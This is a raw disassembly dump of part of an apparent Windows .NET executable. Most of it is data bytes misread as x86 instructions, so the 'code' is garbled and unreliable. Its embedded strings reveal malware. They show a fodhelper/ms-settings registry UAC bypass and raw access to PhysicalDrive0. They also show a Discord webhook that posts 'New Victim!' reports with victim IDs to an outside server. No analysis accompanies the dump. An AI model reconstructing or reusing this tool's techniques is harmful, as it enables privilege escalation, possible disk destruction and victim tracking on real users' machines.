  4036f5:	72 00                	jb     0x4036f7
  4036f7:	4d                   	dec    %ebp
  4036f8:	6f                   	outsl  %ds:(%esi),(%dx)
  4036f9:	6e                   	outsb  %ds:(%esi),(%dx)
  4036fa:	69 74 6f 72 00 49 6e 	imul   $0x746e4900,0x72(%edi,%ebp,2),%esi
  403701:	74 
  403702:	50                   	push   %eax
  403703:	74 72                	je     0x403777
  403705:	00 53 79             	add    %dl,0x79(%ebx)
  403708:	73 74                	jae    0x40377e
  40370a:	65 6d                	gs insl (%dx),%es:(%edi)
  40370c:	2e 44                	cs inc %esp
  40370e:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  403715:	69 63 73 00 53 79 73 	imul   $0x73795300,0x73(%ebx),%esp
  40371c:	74 65                	je     0x403783
  40371e:	6d                   	insl   (%dx),%es:(%edi)
  40371f:	2e 52                	cs push %edx
  403721:	75 6e                	jne    0x403791
  403723:	74 69                	je     0x40378e
  403725:	6d                   	insl   (%dx),%es:(%edi)
  403726:	65 2e 49             	gs cs dec %ecx
  403729:	6e                   	outsb  %ds:(%esi),(%dx)
  40372a:	74 65                	je     0x403791
  40372c:	72 6f                	jb     0x40379d
  40372e:	70 53                	jo     0x403783
  403730:	65 72 76             	gs jb  0x4037a9
  403733:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  40373a:	73 74                	jae    0x4037b0
  40373c:	65 6d                	gs insl (%dx),%es:(%edi)
  40373e:	2e 52                	cs push %edx
  403740:	75 6e                	jne    0x4037b0
  403742:	74 69                	je     0x4037ad
  403744:	6d                   	insl   (%dx),%es:(%edi)
  403745:	65 2e 43             	gs cs inc %ebx
  403748:	6f                   	outsl  %ds:(%esi),(%dx)
  403749:	6d                   	insl   (%dx),%es:(%edi)
  40374a:	70 69                	jo     0x4037b5
  40374c:	6c                   	insb   (%dx),%es:(%edi)
  40374d:	65 72 53             	gs jb  0x4037a3
  403750:	65 72 76             	gs jb  0x4037c9
  403753:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
  40375a:	62 75 67             	bound  %esi,0x67(%ebp)
  40375d:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  403764:	65 
  403765:	73 00                	jae    0x403767
  403767:	4d                   	dec    %ebp
  403768:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  40376f:	74 2e                	je     0x40379f
  403771:	57                   	push   %edi
  403772:	69 6e 33 32 2e 53 61 	imul   $0x61532e32,0x33(%esi),%ebp
  403779:	66 65 48             	gs dec %ax
  40377c:	61                   	popa
  40377d:	6e                   	outsb  %ds:(%esi),(%dx)
  40377e:	64 6c                	fs insb (%dx),%es:(%edi)
  403780:	65 73 00             	gs jae 0x403783
  403783:	64 77 46             	fs ja  0x4037cc
  403786:	6c                   	insb   (%dx),%es:(%edi)
  403787:	61                   	popa
  403788:	67 73 41             	addr16 jae 0x4037cc
  40378b:	6e                   	outsb  %ds:(%esi),(%dx)
  40378c:	64 41                	fs inc %ecx
  40378e:	74 74                	je     0x403804
  403790:	72 69                	jb     0x4037fb
  403792:	62 75 74             	bound  %esi,0x74(%ebp)
  403795:	65 73 00             	gs jae 0x403798
  403798:	6c                   	insb   (%dx),%es:(%edi)
  403799:	70 53                	jo     0x4037ee
  40379b:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  40379f:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  4037a6:	69 
  4037a7:	62 75 74             	bound  %esi,0x74(%ebp)
  4037aa:	65 73 00             	gs jae 0x4037ad
  4037ad:	61                   	popa
  4037ae:	72 67                	jb     0x403817
  4037b0:	73 00                	jae    0x4037b2
  4037b2:	53                   	push   %ebx
  4037b3:	79 73                	jns    0x403828
  4037b5:	74 65                	je     0x40381c
  4037b7:	6d                   	insl   (%dx),%es:(%edi)
  4037b8:	2e 54                	cs push %esp
  4037ba:	68 72 65 61 64       	push   $0x64616572
  4037bf:	69 6e 67 2e 54 61 73 	imul   $0x7361542e,0x67(%esi),%ebp
  4037c6:	6b 73 00 52          	imul   $0x52,0x0(%ebx),%esi
  4037ca:	75 6e                	jne    0x40383a
  4037cc:	74 69                	je     0x403837
  4037ce:	6d                   	insl   (%dx),%es:(%edi)
  4037cf:	65 48                	gs dec %eax
  4037d1:	65 6c                	gs insb (%dx),%es:(%edi)
  4037d3:	70 65                	jo     0x40383a
  4037d5:	72 73                	jb     0x40384a
  4037d7:	00 4e 75             	add    %cl,0x75(%esi)
  4037da:	6d                   	insl   (%dx),%es:(%edi)
  4037db:	62 65 72             	bound  %esp,0x72(%ebp)
  4037de:	4f                   	dec    %edi
  4037df:	66 50                	push   %ax
  4037e1:	61                   	popa
  4037e2:	72 61                	jb     0x403845
  4037e4:	6d                   	insl   (%dx),%es:(%edi)
  4037e5:	65 74 65             	gs je  0x40384d
  4037e8:	72 73                	jb     0x40385d
  4037ea:	00 55 41             	add    %dl,0x41(%ebp)
  4037ed:	43                   	inc    %ebx
  4037ee:	42                   	inc    %edx
  4037ef:	79 70                	jns    0x403861
  4037f1:	61                   	popa
  4037f2:	73 73                	jae    0x403867
  4037f4:	00 64 77 44          	add    %ah,0x44(%edi,%esi,2)
  4037f8:	65 73 69             	gs jae 0x403864
  4037fb:	72 65                	jb     0x403862
  4037fd:	64 41                	fs inc %ecx
  4037ff:	63 63 65             	arpl   %esp,0x65(%ebx)
  403802:	73 73                	jae    0x403877
  403804:	00 47 65             	add    %al,0x65(%edi)
  403807:	74 43                	je     0x40384c
  403809:	75 72                	jne    0x40387d
  40380b:	72 65                	jb     0x403872
  40380d:	6e                   	outsb  %ds:(%esi),(%dx)
  40380e:	74 50                	je     0x403860
  403810:	72 6f                	jb     0x403881
  403812:	63 65 73             	arpl   %esp,0x73(%ebp)
  403815:	73 00                	jae    0x403817
  403817:	45                   	inc    %ebp
  403818:	72 72                	jb     0x40388c
  40381a:	6f                   	outsl  %ds:(%esi),(%dx)
  40381b:	72 53                	jb     0x403870
  40381d:	74 61                	je     0x403880
  40381f:	74 75                	je     0x403896
  403821:	73 00                	jae    0x403823
  403823:	43                   	inc    %ebx
  403824:	6f                   	outsl  %ds:(%esi),(%dx)
  403825:	6e                   	outsb  %ds:(%esi),(%dx)
  403826:	63 61 74             	arpl   %esp,0x74(%ecx)
  403829:	00 46 6f             	add    %al,0x6f(%esi)
  40382c:	72 6d                	jb     0x40389b
  40382e:	61                   	popa
  40382f:	74 00                	je     0x403831
  403831:	4f                   	dec    %edi
  403832:	62 6a 65             	bound  %ebp,0x65(%edx)
  403835:	63 74 00 45          	arpl   %esi,0x45(%eax,%eax,1)
  403839:	78 69                	js     0x4038a4
  40383b:	74 00                	je     0x40383d
  40383d:	47                   	inc    %edi
  40383e:	65 74 52             	gs je  0x403893
  403841:	65 73 75             	gs jae 0x4038b9
  403844:	6c                   	insb   (%dx),%es:(%edi)
  403845:	74 00                	je     0x403847
  403847:	53                   	push   %ebx
  403848:	65 74 52             	gs je  0x40389d
  40384b:	65 73 75             	gs jae 0x4038c3
  40384e:	6c                   	insb   (%dx),%es:(%edi)
  40384f:	74 00                	je     0x403851
  403851:	48                   	dec    %eax
  403852:	74 74                	je     0x4038c8
  403854:	70 43                	jo     0x403899
  403856:	6c                   	insb   (%dx),%es:(%edi)
  403857:	69 65 6e 74 00 53 74 	imul   $0x74530074,0x6e(%ebp),%esp
  40385e:	72 69                	jb     0x4038c9
  403860:	6e                   	outsb  %ds:(%esi),(%dx)
  403861:	67 43                	addr16 inc %ebx
  403863:	6f                   	outsl  %ds:(%esi),(%dx)
  403864:	6e                   	outsb  %ds:(%esi),(%dx)
  403865:	74 65                	je     0x4038cc
  403867:	6e                   	outsb  %ds:(%esi),(%dx)
  403868:	74 00                	je     0x40386a
  40386a:	48                   	dec    %eax
  40386b:	74 74                	je     0x4038e1
  40386d:	70 43                	jo     0x4038b2
  40386f:	6f                   	outsl  %ds:(%esi),(%dx)
  403870:	6e                   	outsb  %ds:(%esi),(%dx)
  403871:	74 65                	je     0x4038d8
  403873:	6e                   	outsb  %ds:(%esi),(%dx)
  403874:	74 00                	je     0x403876
  403876:	53                   	push   %ebx
  403877:	74 61                	je     0x4038da
  403879:	72 74                	jb     0x4038ef
  40387b:	00 4d 6f             	add    %cl,0x6f(%ebp)
  40387e:	76 65                	jbe    0x4038e5
  403880:	4e                   	dec    %esi
  403881:	65 78 74             	gs js  0x4038f8
  403884:	00 53 79             	add    %dl,0x79(%ebx)
  403887:	73 74                	jae    0x4038fd
  403889:	65 6d                	gs insl (%dx),%es:(%edi)
  40388b:	2e 54                	cs push %esp
  40388d:	65 78 74             	gs js  0x403904
  403890:	00 67 65             	add    %ah,0x65(%edi)
  403893:	74 5f                	je     0x4038f4
  403895:	4e                   	dec    %esi
  403896:	6f                   	outsl  %ds:(%esi),(%dx)
  403897:	77 00                	ja     0x403899
  403899:	73 65                	jae    0x403900
  40389b:	74 5f                	je     0x4038fc
  40389d:	43                   	inc    %ebx
  40389e:	72 65                	jb     0x403905
  4038a0:	61                   	popa
  4038a1:	74 65                	je     0x403908
  4038a3:	4e                   	dec    %esi
  4038a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4038a5:	57                   	push   %edi
  4038a6:	69 6e 64 6f 77 00 44 	imul   $0x4400776f,0x64(%esi),%ebp
  4038ad:	65 6c                	gs insb (%dx),%es:(%edi)
  4038af:	61                   	popa
  4038b0:	79 00                	jns    0x4038b2
  4038b2:	49                   	dec    %ecx
  4038b3:	6e                   	outsb  %ds:(%esi),(%dx)
  4038b4:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  4038bb:	65 
  4038bc:	41                   	inc    %ecx
  4038bd:	72 72                	jb     0x403931
  4038bf:	61                   	popa
  4038c0:	79 00                	jns    0x4038c2
  4038c2:	43                   	inc    %ebx
  4038c3:	72 65                	jb     0x40392a
  4038c5:	61                   	popa
  4038c6:	74 65                	je     0x40392d
  4038c8:	53                   	push   %ebx
  4038c9:	75 62                	jne    0x40392d
  4038cb:	4b                   	dec    %ebx
  4038cc:	65 79 00             	gs jns 0x4038cf
  4038cf:	52                   	push   %edx
  4038d0:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  4038d7:	4b 65 
  4038d9:	79 00                	jns    0x4038db
  4038db:	52                   	push   %edx
  4038dc:	65 67 69 73 74 72 79 	imul   $0x7972,%gs:0x74(%bp,%di),%esi
  4038e3:	00 00 
  4038e5:	25 5c 00 5c 00       	and    $0x5c005c,%eax
  4038ea:	2e 00 5c 00 50       	add    %bl,%cs:0x50(%eax,%eax,1)
  4038ef:	00 68 00             	add    %ch,0x0(%eax)
  4038f2:	79 00                	jns    0x4038f4
  4038f4:	73 00                	jae    0x4038f6
  4038f6:	69 00 63 00 61 00    	imul   $0x610063,(%eax),%eax
  4038fc:	6c                   	insb   (%dx),%es:(%edi)
  4038fd:	00 44 00 72          	add    %al,0x72(%eax,%eax,1)
  403901:	00 69 00             	add    %ch,0x0(%ecx)
  403904:	76 00                	jbe    0x403906
  403906:	65 00 30             	add    %dh,%gs:(%eax)
  403909:	00 00                	add    %al,(%eax)
  40390b:	51                   	push   %ecx
  40390c:	68 00 74 00 74       	push   $0x74007400
  403911:	00 70 00             	add    %dh,0x0(%eax)
  403914:	73 00                	jae    0x403916
  403916:	3a 00                	cmp    (%eax),%al
  403918:	2f                   	das
  403919:	00 2f                	add    %ch,(%edi)
  40391b:	00 64 00 69          	add    %ah,0x69(%eax,%eax,1)
  40391f:	00 73 00             	add    %dh,0x0(%ebx)
  403922:	63 00                	arpl   %eax,(%eax)
  403924:	6f                   	outsl  %ds:(%esi),(%dx)
  403925:	00 72 00             	add    %dh,0x0(%edx)
  403928:	64 00 2e             	add    %ch,%fs:(%esi)
  40392b:	00 63 00             	add    %ah,0x0(%ebx)
  40392e:	6f                   	outsl  %ds:(%esi),(%dx)
  40392f:	00 6d 00             	add    %ch,0x0(%ebp)
  403932:	2f                   	das
  403933:	00 61 00             	add    %ah,0x0(%ecx)
  403936:	70 00                	jo     0x403938
  403938:	69 00 2f 00 77 00    	imul   $0x77002f,(%eax),%eax
  40393e:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  403942:	68 00 6f 00 6f       	push   $0x6f006f00
  403947:	00 6b 00             	add    %ch,0x0(%ebx)
  40394a:	73 00                	jae    0x40394c
  40394c:	2f                   	das
  40394d:	00 78 00             	add    %bh,0x0(%eax)
  403950:	78 00                	js     0x403952
  403952:	78 00                	js     0x403954
  403954:	2f                   	das
  403955:	00 79 00             	add    %bh,0x0(%ecx)
  403958:	79 00                	jns    0x40395a
  40395a:	79 00                	jns    0x40395c
  40395c:	00 5f 53             	add    %bl,0x53(%edi)
  40395f:	00 6f 00             	add    %ch,0x0(%edi)
  403962:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  403967:	00 61 00             	add    %ah,0x0(%ecx)
  40396a:	72 00                	jb     0x40396c
  40396c:	65 00 5c 00 43       	add    %bl,%gs:0x43(%eax,%eax,1)
  403971:	00 6c 00 61          	add    %ch,0x61(%eax,%eax,1)
  403975:	00 73 00             	add    %dh,0x0(%ebx)
  403978:	73 00                	jae    0x40397a
  40397a:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40397e:	5c                   	pop    %esp
  40397f:	00 6d 00             	add    %ch,0x0(%ebp)
  403982:	73 00                	jae    0x403984
  403984:	2d 00 73 00 65       	sub    $0x65007300,%eax
  403989:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  40398d:	00 69 00             	add    %ch,0x0(%ecx)
  403990:	6e                   	outsb  %ds:(%esi),(%dx)
  403991:	00 67 00             	add    %ah,0x0(%edi)
  403994:	73 00                	jae    0x403996
  403996:	5c                   	pop    %esp
  403997:	00 73 00             	add    %dh,0x0(%ebx)
  40399a:	68 00 65 00 6c       	push   $0x6c006500
  40399f:	00 6c 00 5c          	add    %ch,0x5c(%eax,%eax,1)
  4039a3:	00 6f 00             	add    %ch,0x0(%edi)
  4039a6:	70 00                	jo     0x4039a8
  4039a8:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  4039ac:	5c                   	pop    %esp
  4039ad:	00 63 00             	add    %ah,0x0(%ebx)
  4039b0:	6f                   	outsl  %ds:(%esi),(%dx)
  4039b1:	00 6d 00             	add    %ch,0x0(%ebp)
  4039b4:	6d                   	insl   (%dx),%es:(%edi)
  4039b5:	00 61 00             	add    %ah,0x0(%ecx)
  4039b8:	6e                   	outsb  %ds:(%esi),(%dx)
  4039b9:	00 64 00 01          	add    %ah,0x1(%eax,%eax,1)
  4039bd:	01 00                	add    %eax,(%eax)
  4039bf:	03 22                	add    (%edx),%esp
  4039c1:	00 00                	add    %al,(%eax)
  4039c3:	1f                   	pop    %ds
  4039c4:	44                   	inc    %esp
  4039c5:	00 65 00             	add    %ah,0x0(%ebp)
  4039c8:	6c                   	insb   (%dx),%es:(%edi)
  4039c9:	00 65 00             	add    %ah,0x0(%ebp)
  4039cc:	67 00 61 00          	add    %ah,0x0(%bx,%di)
  4039d0:	74 00                	je     0x4039d2
  4039d2:	65 00 45 00          	add    %al,%gs:0x0(%ebp)
  4039d6:	78 00                	js     0x4039d8
  4039d8:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  4039dc:	75 00                	jne    0x4039de
  4039de:	74 00                	je     0x4039e0
  4039e0:	65 00 00             	add    %al,%gs:(%eax)
  4039e3:	1b 66 00             	sbb    0x0(%esi),%esp
  4039e6:	6f                   	outsl  %ds:(%esi),(%dx)
  4039e7:	00 64 00 68          	add    %ah,0x68(%eax,%eax,1)
  4039eb:	00 65 00             	add    %ah,0x0(%ebp)
  4039ee:	6c                   	insb   (%dx),%es:(%edi)
  4039ef:	00 70 00             	add    %dh,0x0(%eax)
  4039f2:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4039f6:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  4039fa:	78 00                	js     0x4039fc
  4039fc:	65 00 00             	add    %al,%gs:(%eax)
  4039ff:	11 48 00             	adc    %ecx,0x0(%eax)
  403a02:	48                   	dec    %eax
  403a03:	00 3a                	add    %bh,(%edx)
  403a05:	00 6d 00             	add    %ch,0x0(%ebp)
  403a08:	6d                   	insl   (%dx),%es:(%edi)
  403a09:	00 3a                	add    %bh,(%edx)
  403a0b:	00 73 00             	add    %dh,0x0(%ebx)
  403a0e:	73 00                	jae    0x403a10
  403a10:	00 37                	add    %dh,(%edi)
  403a12:	20 00                	and    %al,(%eax)
  403a14:	4e                   	dec    %esi
  403a15:	00 65 00             	add    %ah,0x0(%ebp)
  403a18:	77 00                	ja     0x403a1a
  403a1a:	20 00                	and    %al,(%eax)
  403a1c:	56                   	push   %esi
  403a1d:	00 69 00             	add    %ch,0x0(%ecx)
  403a20:	63 00                	arpl   %eax,(%eax)
  403a22:	74 00                	je     0x403a24
  403a24:	69 00 6d 00 21 00    	imul   $0x21006d,(%eax),%eax
  403a2a:	20 00                	and    %al,(%eax)
  403a2c:	5b                   	pop    %ebx
  403a2d:	00 7b 00             	add    %bh,0x0(%ebx)
  403a30:	30 00                	xor    %al,(%eax)
  403a32:	7d 00                	jge    0x403a34
  403a34:	5d                   	pop    %ebp
  403a35:	00 20                	add    %ah,(%eax)
  403a37:	00 20                	add    %ah,(%eax)
  403a39:	00 49 00             	add    %cl,0x0(%ecx)
  403a3c:	44                   	inc    %esp
  403a3d:	00 3a                	add    %bh,(%edx)
  403a3f:	00 20                	add    %ah,(%eax)
  403a41:	00 7b 00             	add    %bh,0x0(%ebx)
  403a44:	31 00                	xor    %eax,(%eax)
  403a46:	7d 00                	jge    0x403a48
  403a48:	00 19                	add    %bl,(%ecx)
  403a4a:	7b 00                	jnp    0x403a4c
  403a4c:	22 00                	and    (%eax),%al
  403a4e:	63 00                	arpl   %eax,(%eax)
  403a50:	6f                   	outsl  %ds:(%esi),(%dx)
  403a51:	00 6e 00             	add    %ch,0x0(%esi)
  403a54:	74 00                	je     0x403a56
  403a56:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  403a5a:	74 00                	je     0x403a5c
  403a5c:	22 00                	and    (%eax),%al
  403a5e:	3a 00                	cmp    (%eax),%al
  403a60:	22 00                	and    (%eax),%al
  403a62:	00 05 5c 00 22 00    	add    %al,0x22005c
  403a68:	00 05 22 00 7d 00    	add    %al,0x7d0022
  403a6e:	00 21                	add    %ah,(%ecx)
  403a70:	61                   	popa
  403a71:	00 70 00             	add    %dh,0x0(%eax)
  403a74:	70 00                	jo     0x403a76
  403a76:	6c                   	insb   (%dx),%es:(%edi)
  403a77:	00 69 00             	add    %ch,0x0(%ecx)
  403a7a:	63 00                	arpl   %eax,(%eax)
  403a7c:	61                   	popa
  403a7d:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  403a81:	00 6f 00             	add    %ch,0x0(%edi)
  403a84:	6e                   	outsb  %ds:(%esi),(%dx)
  403a85:	00 2f                	add    %ch,(%edi)
  403a87:	00 6a 00             	add    %ch,0x0(%edx)
  403a8a:	73 00                	jae    0x403a8c
  403a8c:	6f                   	outsl  %ds:(%esi),(%dx)
  403a8d:	00 6e 00             	add    %ch,0x0(%esi)
  403a90:	00 00                	add    %al,(%eax)
  403a92:	00 00                	add    %al,(%eax)
  403a94:	03 b6 4b 13 3a 44    	add    0x443a134b(%esi),%esi
  403a9a:	4d                   	dec    %ebp
  403a9b:	43                   	inc    %ebx
  403a9c:	b1 bb                	mov    $0xbb,%cl
  403a9e:	68 25 76 8e 38       	push   $0x388e7625
  403aa3:	2a 00                	sub    (%eax),%al
  403aa5:	04 20                	add    $0x20,%al
  403aa7:	01 01                	add    %eax,(%ecx)
  403aa9:	08 03                	or     %al,(%ebx)
  403aab:	20 00                	and    %al,(%eax)
  403aad:	01 05 20 01 01 11    	add    %eax,0x11010120
  403ab3:	11 04 20             	adc    %eax,(%eax,%eiz,1)
  403ab6:	01 01                	add    %eax,(%ecx)
  403ab8:	0e                   	push   %cs
  403ab9:	04 20                	add    $0x20,%al
  403abb:	01 01                	add    %eax,(%ecx)
  403abd:	02 05 20 01 01 12    	add    0x12010120,%al
  403ac3:	49                   	dec    %ecx
  403ac4:	05 20 01 01 12       	add    $0x12010120,%eax
  403ac9:	5d                   	pop    %ebp
  403aca:	05 07 02 12 45       	add    $0x45120207,%eax
  403acf:	09 02                	or     %eax,(%edx)
  403ad1:	06                   	push   %es
  403ad2:	18 03                	sbb    %al,(%ebx)
  403ad4:	20 00                	and    %al,(%eax)
  403ad6:	02 05 07 02 1d 05    	add    0x51d0207,%al
  403adc:	08 09                	or     %cl,(%ecx)
  403ade:	00 02                	add    %al,(%edx)
  403ae0:	01 12                	add    %edx,(%edx)
  403ae2:	80 a1 11 80 a5 09 10 	andb   $0x10,0x9a58011(%ecx)
  403ae9:	01 02                	add    %eax,(%edx)
  403aeb:	01 10                	add    %edx,(%eax)
  403aed:	1d 1e 00 08 03       	sbb    $0x308001e,%eax
  403af2:	0a 01                	or     (%ecx),%al
  403af4:	05 04 07 01 11       	add    $0x11010704,%eax
  403af9:	20 04 00             	and    %al,(%eax,%eax,1)
  403afc:	00 11                	add    %dl,(%ecx)
  403afe:	6d                   	insl   (%dx),%es:(%edi)
  403aff:	07                   	pop    %es
  403b00:	30 01                	xor    %al,(%ecx)
  403b02:	01 01                	add    %eax,(%ecx)
  403b04:	10 1e                	adc    %bl,(%esi)
  403b06:	00 04 0a             	add    %al,(%edx,%ecx,1)
  403b09:	01 11                	add    %edx,(%ecx)
  403b0b:	20 04 20             	and    %al,(%eax,%eiz,1)
  403b0e:	00 12                	add    %dl,(%edx)
  403b10:	51                   	push   %ecx
  403b11:	04 07                	add    $0x7,%al
  403b13:	02 02                	add    (%edx),%al
  403b15:	09 04 07             	or     %eax,(%edi,%eax,1)
  403b18:	01 11                	add    %edx,(%ecx)
  403b1a:	24 04                	and    $0x4,%al
  403b1c:	0a 01                	or     (%ecx),%al
  403b1e:	11 24 04             	adc    %esp,(%esp,%eax,1)
  403b21:	07                   	pop    %es
  403b22:	01 11                	add    %edx,(%ecx)
  403b24:	65 04 20             	gs add $0x20,%al
  403b27:	00 11                	add    %dl,(%ecx)
  403b29:	65 04 07             	gs add $0x7,%al
  403b2c:	01 11                	add    %edx,(%ecx)
  403b2e:	28 04 0a             	sub    %al,(%edx,%ecx,1)
  403b31:	01 11                	add    %edx,(%ecx)
  403b33:	28 0a                	sub    %cl,(%edx)
  403b35:	07                   	pop    %es
  403b36:	05 08 0e 12 61       	add    $0x61120e08,%eax
  403b3b:	11 65 12             	adc    %esp,0x12(%ebp)
  403b3e:	69 05 00 00 12 80 a9 	imul   $0x2005a9,0x80120000,%eax
  403b45:	05 20 00 
  403b48:	12 80 ad 03 20 00    	adc    0x2003ad(%eax),%al
  403b4e:	0e                   	push   %cs
  403b4f:	03 06                	add    (%esi),%eax
  403b51:	12 61 05             	adc    0x5(%ecx),%ah
  403b54:	20 01                	and    %al,(%ecx)
  403b56:	12 61 0e             	adc    0xe(%ecx),%ah
  403b59:	06                   	push   %es
  403b5a:	00 03                	add    %al,(%ebx)
  403b5c:	0e                   	push   %cs
  403b5d:	0e                   	push   %cs
  403b5e:	0e                   	push   %cs
  403b5f:	0e                   	push   %cs
  403b60:	05 20 02 01 0e       	add    $0xe010220,%eax
  403b65:	1c 06                	sbb    $0x6,%al
  403b67:	20 01                	and    %al,(%ecx)
  403b69:	01 11                	add    %edx,(%ecx)
  403b6b:	80 bd 08 00 01 12 80 	cmpb   $0x80,0x12010008(%ebp)
  403b72:	a9 12 80 b9 05       	test   $0x5b98012,%eax
  403b77:	00 01                	add    %al,(%ecx)
  403b79:	12 51 08             	adc    0x8(%ecx),%dl
  403b7c:	0a 30                	or     (%eax),%dh
  403b7e:	02 02                	add    (%edx),%al
  403b80:	01 10                	add    %edx,(%eax)
  403b82:	1e                   	push   %ds
  403b83:	00 10                	add    %dl,(%eax)
  403b85:	1e                   	push   %ds
  403b86:	01 06                	add    %eax,(%esi)
  403b88:	0a 02                	or     (%edx),%al
  403b8a:	11 65 11             	adc    %esp,0x11(%ebp)
  403b8d:	20 05 20 01 01 12    	and    %al,0x12010120
  403b93:	69 09 07 04 08 1d    	imul   $0x1d080407,(%ecx),%ecx
  403b99:	05 11 65 12 69       	add    $0x69126511,%eax
  403b9e:	06                   	push   %es
  403b9f:	0a 02                	or     (%edx),%al
  403ba1:	11 65 11             	adc    %esp,0x11(%ebp)
  403ba4:	24 15                	and    $0x15,%al
  403ba6:	07                   	pop    %es
  403ba7:	0a 08                	or     (%eax),%cl
  403ba9:	08 0e                	or     %cl,(%esi)
  403bab:	0e                   	push   %cs
  403bac:	0e                   	push   %cs
  403bad:	12 75 02             	adc    0x2(%ebp),%dh
  403bb0:	11 79 15             	adc    %edi,0x15(%ecx)
  403bb3:	11 7d 01             	adc    %edi,0x1(%ebp)
  403bb6:	12 80 81 12 69 06    	adc    0x6691281(%eax),%al
  403bbc:	00 02                	add    %al,(%edx)
  403bbe:	01 1c 10             	add    %ebx,(%eax,%edx,1)
  403bc1:	02 05 20 02 08 08    	add    0x8080220,%al
  403bc7:	08 04 00             	or     %al,(%eax,%eax,1)
  403bca:	01 01                	add    %eax,(%ecx)
  403bcc:	1c 04                	sbb    $0x4,%al
  403bce:	00 00                	add    %al,(%eax)
  403bd0:	11 79 04             	adc    %edi,0x4(%ecx)
  403bd3:	20 01                	and    %al,(%ecx)
  403bd5:	0e                   	push   %cs
  403bd6:	0e                   	push   %cs
  403bd7:	06                   	push   %es
  403bd8:	00 03                	add    %al,(%ebx)
  403bda:	0e                   	push   %cs
  403bdb:	0e                   	push   %cs
  403bdc:	1c 1c                	sbb    $0x1c,%al
  403bde:	05 20 02 0e 0e       	add    $0xe0e0220,%eax
  403be3:	0e                   	push   %cs
  403be4:	05 00 00 12 80       	add    $0x80120000,%eax
  403be9:	c9                   	leave
  403bea:	08 20                	or     %ah,(%eax)
  403bec:	03 01                	add    (%ecx),%eax
  403bee:	0e                   	push   %cs
  403bef:	12 80 c9 0e 0e 20    	adc    0x200e0ec9(%eax),%al
  403bf5:	02 15 12 80 cd 01    	add    0x1cd8012,%dl
  403bfb:	12 80 81 0e 12 80    	adc    -0x7fedf17f(%eax),%al
  403c01:	d1 08                	rorl   $1,(%eax)
  403c03:	15 12 80 cd 01       	adc    $0x1cd8012,%eax
  403c08:	12 80 81 08 20 00    	adc    0x200881(%eax),%al
  403c0e:	15 11 7d 01 13       	adc    $0x13017d11,%eax
  403c13:	00 07                	add    %al,(%edi)
  403c15:	15 11 7d 01 12       	adc    $0x12017d11,%eax
  403c1a:	80 81 0b 0a 02 15 11 	addb   $0x11,0x15020a0b(%ecx)
  403c21:	7d 01                	jge    0x403c24
  403c23:	12 80 81 11 28 04    	adc    0x4281181(%eax),%al
  403c29:	20 00                	and    %al,(%eax)
  403c2b:	13 00                	adc    (%eax),%eax
  403c2d:	08 b7 7a 5c 56 19    	or     %dh,0x19565c7a(%edi)
  403c33:	34 e0                	xor    $0xe0,%al
  403c35:	89 08                	mov    %ecx,(%eax)
  403c37:	b0 3f                	mov    $0x3f,%al
  403c39:	5f                   	pop    %edi
  403c3a:	7f 11                	jg     0x403c4d
  403c3c:	d5 0a                	aad    $0xa
  403c3e:	3a 04 00             	cmp    (%eax,%eax,1),%al
  403c41:	00 00                	add    %al,(%eax)
  403c43:	40                   	inc    %eax
  403c44:	04 01                	add    $0x1,%al
  403c46:	00 00                	add    %al,(%eax)
  403c48:	00 04 02             	add    %al,(%edx,%eax,1)
  403c4b:	00 00                	add    %al,(%eax)
  403c4d:	00 04 03             	add    %al,(%ebx,%eax,1)
  403c50:	00 00                	add    %al,(%eax)
  403c52:	00 02                	add    %al,(%edx)
  403c54:	06                   	push   %es
  403c55:	09 02                	or     %eax,(%edx)
  403c57:	06                   	push   %es
  403c58:	0e                   	push   %cs
  403c59:	03 06                	add    (%esi),%eax
  403c5b:	12 75 03             	adc    0x3(%ebp),%dh
  403c5e:	06                   	push   %es
  403c5f:	11 2c 02             	adc    %ebp,(%edx,%eax,1)
  403c62:	06                   	push   %es
  403c63:	08 03                	or     %al,(%ebx)
  403c65:	06                   	push   %es
  403c66:	11 6d 03             	adc    %ebp,0x3(%ebp)
  403c69:	06                   	push   %es
  403c6a:	11 65 04             	adc    %esp,0x4(%ebp)
  403c6d:	06                   	push   %es
  403c6e:	12 80 85 04 06 12    	adc    0x12060485(%eax),%al
  403c74:	80 89 08 06 15 11 7d 	orb    $0x7d,0x11150608(%ecx)
  403c7b:	01 12                	add    %edx,(%edx)
  403c7d:	80 81 0b 00 07 12 45 	addb   $0x45,0x1207000b(%ecx)
  403c84:	0e                   	push   %cs
  403c85:	09 09                	or     %ecx,(%ecx)
  403c87:	18 09                	sbb    %cl,(%ecx)
  403c89:	09 18                	or     %ebx,(%eax)
  403c8b:	0b 00                	or     (%eax),%eax
  403c8d:	05 02 12 45 1d       	add    $0x1d451202,%eax
  403c92:	05 09 10 09 18       	add    $0x18091009,%eax
  403c97:	05 20 01 01 1d       	add    $0x1d010120,%eax
  403c9c:	05 04 20 00 1d       	add    $0x1d002004,%eax
  403ca1:	05 04 00 00 12       	add    $0x12000004,%eax
  403ca6:	51                   	push   %ecx
  403ca7:	0a 00                	or     (%eax),%al
  403ca9:	06                   	push   %es
  403caa:	09 09                	or     %ecx,(%ecx)
  403cac:	09 09                	or     %ecx,(%ecx)
  403cae:	18 09                	sbb    %cl,(%ecx)
  403cb0:	10 09                	adc    %cl,(%ecx)
